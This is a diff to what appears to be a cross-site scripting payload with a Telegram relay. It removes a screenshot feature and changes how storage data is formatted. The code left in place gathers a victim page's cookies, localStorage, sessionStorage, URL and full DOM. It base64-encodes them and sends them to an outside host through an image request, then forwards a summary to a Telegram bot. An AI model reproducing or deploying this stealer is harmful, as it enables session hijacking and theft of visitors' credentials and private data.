@@ -34,29 +34,6 @@ function sendData(payload) {
   img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
 }
 
-function takeScreenshot() {
-  try {
-    var canvas = document.createElement('canvas');
-    var ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    
-    // Try html2canvas if available
-    if (typeof html2canvas !== 'undefined') {
-      html2canvas(document.body).then(function(canvas) {
-        data.screenshot = canvas.toDataURL('image/png');
-        finalize();
-      });
-    } else {
-      data.screenshot = "";
-      finalize();
-    }
-  } catch(e) {
-    data.screenshot = "";
-    finalize();
-  }
-}
-
 function collectData() {
   try { data.uri = location.toString() || ""; } catch(e) { data.uri = ""; }
   try { data.cookies = document.cookie || ""; } catch(e) { data.cookies = ""; }
@@ -80,10 +57,6 @@ function collectData() {
   try { data.sessionstorage = JSON.stringify(window.sessionStorage) || ""; } catch(e) { data.sessionstorage = ""; }
   try { data.dom = document.documentElement.outerHTML || ""; } catch(e) { data.dom = ""; }
   
-  takeScreenshot();
-}
-
-function finalize() {
   sendData(data);
 }
 
@@ -119,13 +92,9 @@ Referrer: ${data.referrer}
 User-Agent: ${data['user-agent']}
 Language: ${data.lang}
 GPU: ${data.gpu}
-LocalStorage: ${JSON.stringify(data.localstorage)}
-SessionStorage: ${JSON.stringify(data.sessionstorage)}
+LocalStorage: ${data.localstorage}
+SessionStorage: ${data.sessionstorage}
 DOM Length: ${data.dom?.length || 0} chars`;
-
-  if (data.screenshot && data.screenshot.length > 0) {
-    message += `\nScreenshot: Available`;
-  }
   
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
@@ -136,4 +105,3 @@ DOM Length: ${data.dom?.length || 0} chars`;
     })
   });
 }
-
